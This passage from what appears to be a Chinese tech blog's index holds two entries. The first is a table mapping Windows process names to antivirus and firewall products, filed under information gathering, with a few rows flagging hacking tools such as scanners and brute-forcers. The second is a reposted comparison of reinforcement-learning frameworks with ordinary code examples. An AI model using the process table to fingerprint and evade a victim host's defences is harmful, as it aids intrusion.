<th>A</th>
<th>B</th>
</tr>
</thead>
<tbody>
<tr>
<td>360tray.exe</td>
<td>360安全卫士</td>
</tr>
<tr>
<td>360sd.exe</td>
<td>360杀毒</td>
</tr>
<tr>
<td>a2guard.exe</td>
<td>a-squared杀毒</td>
</tr>
<tr>
<td>ad-watch.exe</td>
<td>Lavasoft杀毒</td>
</tr>
<tr>
<td>cleaner8.exe</td>
<td>The Cleaner杀毒</td>
</tr>
<tr>
<td>vba32lder.exe</td>
<td>vb32杀毒</td>
</tr>
<tr>
<td>MongoosaGUI.exe</td>
<td>Mongoosa杀毒</td>
</tr>
<tr>
<td>CorantiControlCenter32.exe</td>
<td>Coranti2012杀毒</td>
</tr>
<tr>
<td>F-PROT.EXE</td>
<td>F-PROT杀毒</td>
</tr>
<tr>
<td>CMCTrayIcon.exe</td>
<td>CMC杀毒</td>
</tr>
<tr>
<td>K7TSecurity.exe</td>
<td>K7杀毒</td>
</tr>
<tr>
<td>UnThreat.exe</td>
<td>UnThreat杀毒</td>
</tr>
<tr>
<td>CKSoftShiedAntivirus4.exe</td>
<td>Shield Antivirus杀毒</td>
</tr>
<tr>
<td>AVWatchService.exe</td>
<td>VIRUSfighter杀毒</td>
</tr>
<tr>
<td>ArcaTasksService.exe</td>
<td>ArcaVir杀毒</td>
</tr>
<tr>
<td>iptray.exe</td>
<td>Immunet杀毒</td>
</tr>
<tr>
<td>PSafeSysTray.exe</td>
<td>PSafe杀毒</td>
</tr>
<tr>
<td>nspupsvc.exe</td>
<td>nProtect杀毒</td>
</tr>
<tr>
<td>SpywareTerminatorShield.exe</td>
<td>SpywareTerminator杀毒</td>
</tr>
<tr>
<td>BKavService.exe</td>
<td>Bkav杀毒</td>
</tr>
<tr>
<td>MsMpEng.exe</td>
<td>Microsoft Security Essentials</td>
</tr>
<tr>
<td>SBAMSvc.exe</td>
<td>VIPRE</td>
</tr>
<tr>
<td>ccSvcHst.exe</td>
<td>Norton杀毒</td>
</tr>
<tr>
<td>QQ.exe</td>
<td>QQ</td>
</tr>
<tr>
<td>f-secure.exe</td>
<td>冰岛</td>
</tr>
<tr>
<td>avp.exe</td>
<td>卡巴斯基</td>
</tr>
<tr>
<td>KvMonXP.exe</td>
<td>江民杀毒</td>
</tr>
<tr>
<td>RavMonD.exe</td>
<td>瑞星杀毒</td>
</tr>
<tr>
<td>Mcshield.exe</td>
<td>麦咖啡</td>
</tr>
<tr>
<td>egui.exe</td>
<td>NOD32</td>
</tr>
<tr>
<td>kxetray.exe</td>
<td>金山毒霸</td>
</tr>
<tr>
<td>knsdtray.exe</td>
<td>可牛杀毒</td>
</tr>
<tr>
<td>TMBMSRV.exe</td>
<td>趋势杀毒</td>
</tr>
<tr>
<td>avcenter.exe</td>
<td>Avira(小红伞)</td>
</tr>
<tr>
<td>ashDisp.exe</td>
<td>Avast网络安全</td>
</tr>
<tr>
<td>rtvscan.exe</td>
<td>诺顿杀毒</td>
</tr>
<tr>
<td>ksafe.exe</td>
<td>金山卫士</td>
</tr>
<tr>
<td>QQPCRTP.exe</td>
<td>QQ电脑管家</td>
</tr>
<tr>
<td>Miner.exe</td>
<td>流量矿石</td>
</tr>
<tr>
<td>AYAgent.aye</td>
<td>韩国胶囊</td>
</tr>
<tr>
<td>patray.exe</td>
<td>安博士</td>
</tr>
<tr>
<td>V3Svc.exe</td>
<td>安博士V3</td>
</tr>
<tr>
<td>avgwdsvc.exe</td>
<td>AVG杀毒</td>
</tr>
<tr>
<td>ccSetMgr.exe</td>
<td>赛门铁克</td>
</tr>
<tr>
<td>QUHLPSVC.EXE</td>
<td>QUICK HEAL杀毒</td>
</tr>
<tr>
<td>mssecess.exe</td>
<td>微软杀毒</td>
</tr>
<tr>
<td>SavProgress.exe</td>
<td>Sophos杀毒</td>
</tr>
<tr>
<td>fsavgui.exe</td>
<td>F-Secure杀毒</td>
</tr>
<tr>
<td>vsserv.exe</td>
<td>比特梵德</td>
</tr>
<tr>
<td>remupd.exe</td>
<td>熊猫卫士</td>
</tr>
<tr>
<td>FortiTray.exe</td>
<td>飞塔</td>
</tr>
<tr>
<td>safedog.exe</td>
<td>安全狗</td>
</tr>
<tr>
<td>parmor.exe</td>
<td>木马克星</td>
</tr>
<tr>
<td>beikesan.exe</td>
<td>贝壳云安全</td>
</tr>
<tr>
<td>KSWebShield.exe</td>
<td>金山网盾</td>
</tr>
<tr>
<td>TrojanHunter.exe</td>
<td>木马猎手</td>
</tr>
<tr>
<td>GG.exe</td>
<td>巨盾网游安全盾</td>
</tr>
<tr>
<td>adam.exe</td>
<td>绿鹰安全精灵</td>
</tr>
<tr>
<td>AST.exe</td>
<td>超级巡警</td>
</tr>
<tr>
<td>ananwidget.exe</td>
<td>墨者安全专家</td>
</tr>
<tr>
<td>AVK.exe</td>
<td>GData</td>
</tr>
<tr>
<td>ccapp.exe</td>
<td>Symantec Norton</td>
</tr>
<tr>
<td>avg.exe</td>
<td>AVG Anti-Virus</td>
</tr>
<tr>
<td>spidernt.exe</td>
<td>Dr.web</td>
</tr>
<tr>
<td>Mcshield.exe</td>
<td>Mcafee</td>
</tr>
<tr>
<td>avgaurd.exe</td>
<td>Avira Antivir</td>
</tr>
<tr>
<td>F-PROT.exe</td>
<td>F-Prot AntiVirus</td>
</tr>
<tr>
<td>vsmon.exe</td>
<td>ZoneAlarm</td>
</tr>
<tr>
<td>avp.exee</td>
<td>Kaspersky</td>
</tr>
<tr>
<td>cpf.exe</td>
<td>Comodo</td>
</tr>
<tr>
<td>outpost.exe</td>
<td>Outpost Firewall</td>
</tr>
<tr>
<td>rfwmain.exe</td>
<td>瑞星防火墙</td>
</tr>
<tr>
<td>kpfwtray.exe</td>
<td>金山网镖</td>
</tr>
<tr>
<td>FYFireWall.exe</td>
<td>风云防火墙</td>
</tr>
<tr>
<td>MPMon.exe</td>
<td>微点主动防御</td>
</tr>
<tr>
<td>pfw.exe</td>
<td>天网防火墙</td>
</tr>
<tr>
<td>S.exe</td>
<td>在抓鸡</td>
</tr>
<tr>
<td>1433.exe</td>
<td>在扫1433</td>
</tr>
<tr>
<td>DUB.exe</td>
<td>在爆破</td>
</tr>
<tr>
<td>ServUDaemon.exe</td>
<td>发现S-U</td>
</tr>
<tr>
<td>BaiduSdSvc.exe</td>
<td>百度杀软</td>
</tr>
<tr>
<td>SafeDogGuardCenter.exe,safedogupdatecenter.exe,safedogguardcenter.exe,SafeDogSiteIIS.exe,SafeDogTray.exe,SafeDogServerUI.exe</td>
<td>安全狗</td>
</tr>
<tr>
<td>D_Safe_Manage.exe,d_manage.exe</td>
<td>D盾</td>
</tr>
<tr>
<td>yunsuo_agent_service.exe,yunsuo_agent_daemon.exe</td>
<td>云锁</td>
</tr>
<tr>
<td>HwsPanel.exe,hws_ui.exe,hws.exe,hwsd.exe</td>
<td>护卫神</td>
</tr>
<tr>
<td>HipsDaemon.exe,HipsTray.exe,wsctrl.exe,usysdiag.exe</td>
<td>火绒</td>
</tr>
</tbody>
</table>
</div>
]]></content>
      <categories>
        <category>安全开发</category>
      </categories>
      <tags>
        <tag>信息搜集</tag>
      </tags>
  </entry>
  <entry>
    <title>常见强化学习框架比较</title>
    <url>/2019/12/24/%E5%B8%B8%E8%A7%81%E5%BC%BA%E5%8C%96%E5%AD%A6%E4%B9%A0%E6%A1%86%E6%9E%B6%E6%AF%94%E8%BE%83/</url>
    <content><![CDATA[<p><em>A Comparison of Reinforcement Learning Frameworks: Dopamine, RLLib, Keras-RL, Coach, TRFL, Tensorforce, Coach and more</em></p>
<p>（原文中的视频和谷歌趋势图可到原文中查看）</p>
<p>文中未涉及的框架：</p>
<ul>
<li><a href="https://github.com/openai/baselines">Baselines</a></li>
<li><a href="https://github.com/astooke/rlpyt">rlpyt</a></li>
</ul>
<p>PS 有一篇相关论文<a href="http://www.koreascience.or.kr/article/JAKO201974757494930.page">A Survey on Deep Reinforcement Learning Libraries</a>，韩文</p>
<span id="more"></span>
<p><em>Reinforcement Learning</em> (RL) frameworks help engineers by creating higher level abstractions of the core components of an RL algorithm. This makes code easier to develop, easier to read and improves efficiency.</p>
<p>But choosing a framework introduces some amount of lock in. An investment in learning and using a framework can make it hard to break away. This is just like when you decide which pub to visit. It’s very difficult not to buy a beer, no matter how bad the place is.</p>
<p>In this post I provide some notes about the most popular RL frameworks available. I also present some crude summary statistics from Github and Google (which you can’t trust) to attempt to quantify their popularity.</p>
<p>I believe posts like this are useful, but sometimes people are upset because I don’t like something about their framework. I do not want to upset anyone. If I do, I’m sorry. The work performed by the framework authors is nothing less than extraordinary. This is my meagre interpretation using the little time I have available. Please <a href="https://WinderResearch.com/contact/">contact me</a> to make corrections.</p>
<h1 id="Original-Purpose-of-this-Work"><a href="#Original-Purpose-of-this-Work" class="headerlink" title="Original Purpose of this Work"></a>Original Purpose of this Work</h1><p>I am <a href="https://WinderResearch.com/announcement-new-reinforcement-learning-book-with-oreilly/">writing a book on RL for O’Reilly</a>. As a part of that book, I want to demonstrate to my readers how to build and design various RL agents. I think the readers will benefit by using code from an already-established framework or library. And in any case, the people writing these frameworks would probably do a better job than I could anyway.</p>
<p>So the question was, “which framework?”. Which led me down this path. It started with a few frameworks, but then I found more. And more. And it turns out there are quite a lot of frameworks already available, which turned this into a 8000 word monster. Apologies in advance for the length. I don’t expect many people to read all of it!</p>
<p>Because of the length, this also took a while to write. This means that the reviews don’t have laser-focus. Sometimes I comment about one thing in one framework and not at all in another. Apologies for this; it was not intended to be exhaustive.</p>
<h1 id="Methodology"><a href="#Methodology" class="headerlink" title="Methodology"></a>Methodology</h1><p>Most of the evaluation is pure opinion. But there are a few quantitative metrics we can look at. Namely the statistics of the repository that are made available in Github. Starts roughly represent how well known each of the frameworks are, but they do not represent quality. More often than not the frameworks with the most stars have more marketing power.</p>
<p>After that, I was looking for a combination of modularity, ease of use, flexibility and maturity. Simplicity was also desired, but this is usually mutually exclusive with modularity and flexibility. The opinions presented below are based upon these ideals.</p>
<p>One reoccurring theme is the dominance of <em>Deep Learning</em> (DL) frameworks within the RL framework. Quite often the DL framework would breakout above the abstractions and the RL framework would just be an extension of the former. This means that if you are in a situation where you are already in bed with a particular DL solution, then you might as well stick with that.</p>
<p>But to me, that represents lock-in. My preference would always tend towards the frameworks that don’t mandate a specific DL implementation or don’t use DL at all (shock/horror!). The result is that all the Google frameworks tend towards Tensorflow, all the academic frameworks use PyTorch then there are a few brave souls dangling in-between with twice as much work as everyone else.</p>
<p>I also attempted to look at the Google rankings for each framework, but that <a href="##google-rankings">turned out to be unreliable</a>.</p>
<h1 id="Accompanying-Notebook"><a href="#Accompanying-Notebook" class="headerlink" title="Accompanying Notebook"></a>Accompanying Notebook</h1><p>Where I could, or where it made sense, I tried out a lot of these frameworks. Many of them didn’t work. And some of them had excellent Notebooks to begin with, so you can just check those out.</p>
<p>For the rest, I have <a href="https://colab.research.google.com/gist/philwinder/07cbe7b696745ac25c0f6a2aadbcd3c7/framework-research.ipynb">published a gist that you can run on Google Colabratory</a>. This is presented in a very raw format. It is not meant to be comprehensive or explanatory. I simply wanted to double check that in the simplest of cases, it worked.</p>
<p>In each section I also present a “Getting Started” sub-heading that demonstrates the basic example from each framework. This code is from the Notebook.</p>
<h1 id="Reinforcement-Learning-Frameworks"><a href="#Reinforcement-Learning-Frameworks" class="headerlink" title="Reinforcement Learning Frameworks"></a>Reinforcement Learning Frameworks</h1><p>The following frameworks are listed in order of the number of stars in their Github repository as of June 2019. The actual number of stars and other metrics are presented as badges just below the title of each framework.</p>
<p>The following frameworks are compared:</p>
<ul>
<li><a href="##OpenAI\ Gym">OpenAI Gym</a></li>
<li><a href="##Google\ Dopamine">Google Dopamine</a></li>
<li><a href="##RLLib\ via\ ray-project">RLLib</a></li>
<li><a href="##Keras-RL">Keras-RL</a></li>
<li><a href="##TRFL">TRFL</a></li>
<li><a href="##Tensorforce">Tensorforce</a></li>
<li><a href="##Facebook\ Horizon">Facebook Horizon</a></li>
<li><a href="##Nervana\ Systems\ Coach">Nervana Systems Coach</a></li>
<li><a href="##MAgent">MAgent</a></li>
<li><a href="##SLM-Lab">SLM-Lab</a></li>
<li><a href="##DeeR">DeeR</a></li>
<li><a href="##Garage">Garage</a></li>
<li><a href="##Surreal">Surreal</a></li>
<li><a href="##RLgraph">RLgraph</a></li>
<li><a href="##Simple\ RL">Simple RL</a></li>
</ul>
<h2 id="OpenAI-Gym"><a href="#OpenAI-Gym" class="headerlink" title="OpenAI Gym"></a><a href="https://github.com/openai/gym">OpenAI Gym</a></h2><p><img src="https://img.shields.io/github/stars/openai/gym.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/issues-closed-raw/openai/gym.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/contributors/openai/gym.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/last-commit/openai/gym.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/commit-activity/y/openai/gym.svg?style=flat-square" alt=""></p>
<p>OpenAI is a not-profit, pure research company. The provide a range of open-source Deep and Reinforcement Learning tools to improve repeatability, create benchmarks and improve upon the state of the art. I like to think of them as a bridge between academia and industry.</p>
<p>But I know what you’re thinking. “Phil, Gym is not a framework. It is an environment.”. I know, I know. It provides a range of toy environments, classic control, robotics, video games and board games to test your RL algorithm against.</p>
<p>But I have included it here because it is used so often as the basis for custom work. People use it like a framework. Think of it as an interface between an RL implementation and the environment. It is so prolific, many of the other frameworks listed below also interface with Gym. Furthermore it acts as a baseline as to compare everything against. Since this is one of the most popular repositories in RL.</p>
<h2 id="Getting-Started"><a href="#Getting-Started" class="headerlink" title="Getting Started"></a>Getting Started</h2><p>Gym is both cool and problematic because of it’s realistic 3D environments. If you want to visualise what is going on you need to be able to render these environments. It pretty much works on your laptop, but struggles when you try and run it in a Notebook because of limitations with the browser.</p>
<p>To work around this, you have to use a virtual display. Basically we have to mock out the video driver. This means most of the “getting started” code is video wrapping code.</p>
<p>If we ignore all the boring stuff, which you can find in the accompanying Notebook, the core gym code looks like:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gym</span><br><span class="line"><span class="keyword">from</span> gym.wrappers.monitoring.video_recorder <span class="keyword">import</span> VideoRecorder <span class="comment"># Because we want to record a video</span></span><br><span class="line"></span><br><span class="line">env = gym.make(<span class="string">&quot;CartPole-v1&quot;</span>) <span class="comment"># Create the cartpole environment</span></span><br><span class="line">rec = VideoRecorder(env)      <span class="comment"># Create the video recorder</span></span><br><span class="line">rec.capture_frame()           <span class="comment"># Capture the starting position</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    action = env.action_space.sample()                   <span class="comment"># Use a random action</span></span><br><span class="line">    observation, reward, done, info = env.step(action)   <span class="comment"># to take a single step in the environment</span></span><br><span class="line">    rec.capture_frame()                                  <span class="comment"># and record</span></span><br><span class="line">    <span class="keyword">if</span> done:</span><br><span class="line">           <span class="keyword">break</span>                                         <span class="comment"># If the pole has fallen, quit.</span></span><br><span class="line">rec.close()  <span class="comment"># Close the recording</span></span><br><span class="line">env.close()  <span class="comment"># Close the environment</span></span><br></pre></td></tr></table></figure>
<p>As you can see, it falls straight away because we’re just passing random actions at the moment. But still, there’s something hypnotic, something drum-and-bass about it.</p>
<p>But now let’s look at some agent framework only options.</p>
<h2 id="Google-Dopamine"><a href="#Google-Dopamine" class="headerlink" title="Google Dopamine"></a><a href="https://github.com/google/dopamine">Google Dopamine</a></h2><p><img src="https://img.shields.io/github/stars/google/dopamine.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/issues-closed-raw/google/dopamine.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/contributors/google/dopamine.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/last-commit/google/dopamine.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/commit-activity/y/google/dopamine.svg?style=flat-square" alt=""></p>
<p>Google Dopamine: “Not an Official Google product” (NOGP - an acronym I’m going to coin now) but written by Google employees and hosted on Google github. So, Google Dopamine then. It is a relatively new entrant to the RL framework space that appears to have been a hit. It boasts a large number of Github stars and some amount of Google trend ranking. This is especially surprising because of the limited number of commits, committers and time since the project was launched. Clearly it helps you have Google’s branding and marketing department.</p>
<p>Anyway, the cool thing about this framework is that it emphasises configuration as code through it’s use of the <a href="https://github.com/google/gin-config">Google gin-config</a> configuration framework. The idea is that you have lots of pluggable bits that you plumb together through a configuration file. The benefit is that this allows people to release a single configuration file that contains all of the parameters specific to that run. And gin-config makes things special because it allows you to plumb together objects; instances of classes and lambdas and things like that.</p>
<p>The downside is that you increase the complexity in the configuration file and it can end up like just another file full of code that people can’t understand because they are not used to it. Personally I would always stick to a “dumb” configuration file like Kubernetes Manifests or JSON (like many of the other frameworks), for example. The wiring should be done in the code.</p>
<p>The one major benefit is that it promotes plugability and reuse, which are key OOP and Functional concepts that are often ignored when developing <a href="https://WinderResearch.com/what-is-data-science/">Data Science</a> products.</p>
<p>It is clear that it has gained a significant amount of traction in a very short time. And frankly, that worries me a bit. There are four contributors and only 100 commits. Of those four people, three are from the community (bug-fixes, etc.). This leaves one person. And this one person has committed, wait for it, <a href="https://github.com/google/dopamine/graphs/contributors"><strong>over 1.3 million lines of code</strong></a>.</p>
<p>Clearly there’s something fishing going on here. From the commit history it looks like the code was <a href="https://github.com/google/dopamine/commit/420b147474d455fe39d911432fe579e54db3a1e0">transferred from another repo</a>. A 1.2 million line commit isn’t exactly best practice! :-) It’s Apache licensed, so there’s nothing too strange going on but the copyright has been assigned to <a href="https://github.com/google/dopamine">Google Inc.</a>. But I’m reassured by the <a href="https://github.com/google/dopamine/blob/master/CONTRIBUTING.md#contributor-license-agreement">contributor agreement</a>.</p>
<p>In terms of modularity, there isn’t much. There isn’t any abstraction for the <a href="https://github.com/google/dopamine/tree/master/dopamine/agents">Agents</a>; they are implemented directly and configured from the gin config. There’s not many implemented either. There isn’t any official abstraction of an environment either. In fact, it looks like they are just passing back core Tensorflow objects everywhere and assuming using the Tensorflow interface. In short, very little official OOP-style abstraction, which is different to most of the other frameworks.</p>
<p>In short, little modularity, reuse is clunky (IMO) and although it appears to be popular, it isn’t very mature and doesn’t have community support.</p>
<h3 id="Getting-Started-1"><a href="#Getting-Started-1" class="headerlink" title="Getting Started"></a>Getting Started</h3><p>Again you can find the example in the accompanying Notebook, but the premise is to build your RL algorithm via a configuration file. This is what it looks like:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">DQN_PATH = os.path.join(BASE_PATH, <span class="string">&#x27;dqn&#x27;</span>)</span><br><span class="line"><span class="comment"># Modified from dopamine/agents/dqn/config/dqn_cartpole.gin</span></span><br><span class="line">dqn_config = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"># Hyperparameters for a simple DQN-style Cartpole agent. The hyperparameters</span></span><br><span class="line"><span class="string"># chosen achieve reasonable performance.</span></span><br><span class="line"><span class="string">import dopamine.discrete_domains.gym_lib</span></span><br><span class="line"><span class="string">import dopamine.discrete_domains.run_experiment</span></span><br><span class="line"><span class="string">import dopamine.agents.dqn.dqn_agent</span></span><br><span class="line"><span class="string">import dopamine.replay_memory.circular_replay_buffer</span></span><br><span class="line"><span class="string">import gin.tf.external_configurables</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">DQNAgent.observation_shape = %gym_lib.CARTPOLE_OBSERVATION_SHAPE</span></span><br><span class="line"><span class="string">DQNAgent.observation_dtype = %gym_lib.CARTPOLE_OBSERVATION_DTYPE</span></span><br><span class="line"><span class="string">DQNAgent.stack_size = %gym_lib.CARTPOLE_STACK_SIZE</span></span><br><span class="line"><span class="string">DQNAgent.network = @gym_lib.cartpole_dqn_network</span></span><br><span class="line"><span class="string">DQNAgent.gamma = 0.99</span></span><br><span class="line"><span class="string">DQNAgent.update_horizon = 1</span></span><br><span class="line"><span class="string">DQNAgent.min_replay_history = 500</span></span><br><span class="line"><span class="string">DQNAgent.update_period = 4</span></span><br><span class="line"><span class="string">DQNAgent.target_update_period = 100</span></span><br><span class="line"><span class="string">DQNAgent.epsilon_fn = @dqn_agent.identity_epsilon</span></span><br><span class="line"><span class="string">DQNAgent.tf_device = &#x27;/gpu:0&#x27;  # use &#x27;/cpu:*&#x27; for non-GPU version</span></span><br><span class="line"><span class="string">DQNAgent.optimizer = @tf.train.AdamOptimizer()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">tf.train.AdamOptimizer.learning_rate = 0.001</span></span><br><span class="line"><span class="string">tf.train.AdamOptimizer.epsilon = 0.0003125</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">create_gym_environment.environment_name = &#x27;CartPole&#x27;</span></span><br><span class="line"><span class="string">create_gym_environment.version = &#x27;v0&#x27;</span></span><br><span class="line"><span class="string">create_agent.agent_name = &#x27;dqn&#x27;</span></span><br><span class="line"><span class="string">TrainRunner.create_environment_fn = @gym_lib.create_gym_environment</span></span><br><span class="line"><span class="string">Runner.num_iterations = 100</span></span><br><span class="line"><span class="string">Runner.training_steps = 100</span></span><br><span class="line"><span class="string">Runner.evaluation_steps = 100</span></span><br><span class="line"><span class="string">Runner.max_steps_per_episode = 200  # Default max episode length.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">WrappedReplayBuffer.replay_capacity = 50000</span></span><br><span class="line"><span class="string">WrappedReplayBuffer.batch_size = 128</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">gin.parse_config(dqn_config, skip_unknown=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
<p>That’s quite a lot. But it’s implementing a more complicated algorithm so we might expect that. I’m quite happy about the hyperparameters being in there, but I’m not sure that I am a fan of all the dynamic injection (the <code>@</code> denotes an instance of a class). Proponents would say that “wow, look, I can just swap out the optimiser just by changing this line”. But I’m of the opinion that I could do that with plain old Python too.</p>
<p>After a bit of training:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">tf.reset_default_graph()</span><br><span class="line">dqn_runner = run_experiment.create_runner(DQN_PATH, schedule=<span class="string">&#x27;continuous_train&#x27;</span>)</span><br><span class="line">dqn_runner.run_experiment()</span><br></pre></td></tr></table></figure>
<p>Then we can run some similar code to before to generate a nice video:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">rec = VideoRecorder(dqn_runner._environment.environment)</span><br><span class="line">action = dqn_runner._initialize_episode()</span><br><span class="line">rec.capture_frame()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    observation, reward, is_terminal = dqn_runner._run_one_step(action)</span><br><span class="line">    rec.capture_frame()</span><br><span class="line">    <span class="keyword">if</span> is_terminal:</span><br><span class="line">      <span class="keyword">break</span> <span class="comment"># If the pole has fallen, quit.</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      action = dqn_runner._agent.step(reward, observation)</span><br><span class="line">dqn_runner._end_episode(reward)</span><br><span class="line">rec.close()</span><br></pre></td></tr></table></figure>
<h2 id="RLLib-via-ray-project"><a href="#RLLib-via-ray-project" class="headerlink" title="RLLib via ray-project"></a><a href="https://ray.readthedocs.io/en/latest/rllib.html">RLLib</a> via <a href="https://github.com/ray-project/ray">ray-project</a></h2><p><img src="https://img.shields.io/github/stars/ray-project/ray.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/issues-closed-raw/ray-project/ray.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/contributors/ray-project/ray.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/last-commit/ray-project/ray.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/commit-activity/y/ray-project/ray.svg?style=flat-square" alt=""></p>
<p>Ray <a href="https://github.com/ray-project/ray/tree/ray-0.3.0">started life</a> as a project that aimed to help Python users build scalable software, primarily for ML purposes. Since then it has added several modules that are dedicated to specific ML use cases. One is <a href="https://ray.readthedocs.io/en/latest/tune.html">distributed hyperparameter tuning</a> and the other is <a href="https://ray.readthedocs.io/en/latest/rllib.html">distributed RL</a>.</p>
<p>The consequence of this generalisation is that the popularity numbers are probably more due to the hyperparameter and general purpose scalability use case, rather than RL. Also, the distributed focus of the library means that the agent implementations tend to be those that are inherently distributed (e.g. A3C) or are attempting to solve problems that are so complex they need distributing so that they don’t take years to converge (e.g. Rainbow).</p>
<p>Despite this, if you are looking to productionise RL, or if you are repeating training many times for hyperparameter tuning or environment improvements, then it probably makes sense to use ray to be able to scale up and reduce feedback times. In fact, a number of other frameworks (specifically: <a href="##slm-lab">SLM-Lab</a> and <a href="##rlgraph">RLgraph</a>) actually use ray under the hood for this purpose.</p>
<p>I believe there is a strong applicability to RL here. The clear focus on distributed computation is good.The sheer number of commits and contributors is also reassuring. But there is a lot of the underlying code in C++. Some even in Java. Only 60% is python.</p>
<p>Despite this there is a very clear abstraction for <a href="https://github.com/ray-project/ray/blob/master/python/ray/rllib/policy/policy.py"><code>Policy</code>s</a>, a nice, almost functional interface for agents called <a href="https://github.com/ray-project/ray/blob/master/python/ray/rllib/agents/trainer.py"><code>Trainer</code>s</a> (see the <a href="https://github.com/ray-project/ray/blob/master/python/ray/rllib/agents/dqn/dqn.py">DQN implementation</a> for an example of its usage), a <a href="https://github.com/ray-project/ray/blob/master/python/ray/rllib/models/model.py"><code>Model</code></a> abstraction that allows the use of PyTorch or Tensorflow (yay!) and a few more for evaluation and policy optimisation.</p>
<p>Overall the documentation is excellent and clear architectural drawings are presented (see <a href="https://ray.readthedocs.io/en/latest/rllib-models.html">this example</a>, for example). It is modular, scales well and is very well supported and accepted by the community. The only downside is the complexity of it all. That’s the price you pay for all this functionality.</p>
<h3 id="Getting-Started-2"><a href="#Getting-Started-2" class="headerlink" title="Getting Started"></a>Getting Started</h3><p>There is an <a href="https://github.com/ray-project/ray/issues/5033">issue</a> with the version of pyarrow preinstalled in Google colab that isn’t compatible with ray. You have to uninstall the preinstalled version and restart the runtime, then it works.</p>
<p>I also couldn’t get the video rendering working in the same way we made the previous examples work. My hypothesis is that because they are running in separate processes they don’t have access to the fake <code>pyvirtualdisplay</code> device.</p>
<p>So despite this, let us try an example:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">!pip uninstall -y pyarrow</span><br><span class="line">!pip install tensorflow ray[rllib] &gt; /dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>After you remove pyarrow and install rllib, you must restart the Notebook kernel. Next, import ray:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ray</span><br><span class="line"><span class="keyword">from</span> ray <span class="keyword">import</span> tune</span><br><span class="line"></span><br><span class="line">ray.init()</span><br></pre></td></tr></table></figure>
<p>And run a hyperparameter tuning job for the Cartpole environment using a DQN:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">tune.run(</span><br><span class="line">    <span class="string">&quot;DQN&quot;</span>,</span><br><span class="line">    stop=&#123;<span class="string">&quot;episode_reward_mean&quot;</span>: <span class="number">100</span>&#125;,</span><br><span class="line">    config=&#123;</span><br><span class="line">        <span class="string">&quot;env&quot;</span>: <span class="string">&quot;CartPole-v0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;num_gpus&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;num_workers&quot;</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="string">&quot;lr&quot;</span>: tune.grid_search([<span class="number">0.01</span>, <span class="number">0.001</span>, <span class="number">0.0001</span>]),</span><br><span class="line">        <span class="string">&quot;monitor&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>There is a lot of syntactic sugar here, but it looks <a href="https://github.com/ray-project/ray/blob/master/python/ray/rllib/examples/custom_train_fn.py">reasonably straightforward</a> to customise the training functionality (<a href="https://ray.readthedocs.io/en/latest/rllib-training.html#custom-training-workflows">docs</a>).</p>
<h2 id="Keras-RL"><a href="#Keras-RL" class="headerlink" title="Keras-RL"></a><a href="https://github.com/keras-rl/keras-rl">Keras-RL</a></h2><p><img src="https://img.shields.io/github/stars/keras-rl/keras-rl.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/issues-closed-raw/keras-rl/keras-rl.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/contributors/keras-rl/keras-rl.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/last-commit/keras-rl/keras-rl.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/commit-activity/y/keras-rl/keras-rl.svg?style=flat-square" alt=""></p>
<p>I love Keras. I love the abstraction, the simplicity, the anti-lock-in. When you look at the code below you can see the Keras magic. So you would think that keras-rl would be a perfect fit. However it doesn’t seem to have obtained as much traction as the other frameworks. If you <a href="https://keras-rl.readthedocs.io/en/latest/">look at the documentation</a>, it’s empty. When you look at the commits there only a few brave souls that have done most of the work. Compare this to the <a href="https://github.com/keras-team/keras">main Keras project</a>.</p>
<p>And I think I might know why. Keras was built from the ground up to allow users to quickly prototype different DL structures. This relied on the fact that the Neural Network primitives could be abstracted and modular. But when you look at the code for keras-rl, it’s implemented like it is in the textbooks. Each agent has it’s own implementation despite the similarities between SARSA and DQN, for example. Think of all the “tricks” that could be modularised, tricks like those that are used for Rainbow, which could allow people to experiment using these tricks in other agents. There is some level of modularity, but I think it is at a level that is too high.</p>
<p>But maybe it’s not too late, because there is so much promise here. If there were enough people interested, or maybe if there was more support from the core Keras project, then maybe this could be the go-to RL framework of the future. But for now, I don’t think it is. It’s almost as easy to obtain the benefits of Keras by using other frameworks that we have already discussed.</p>
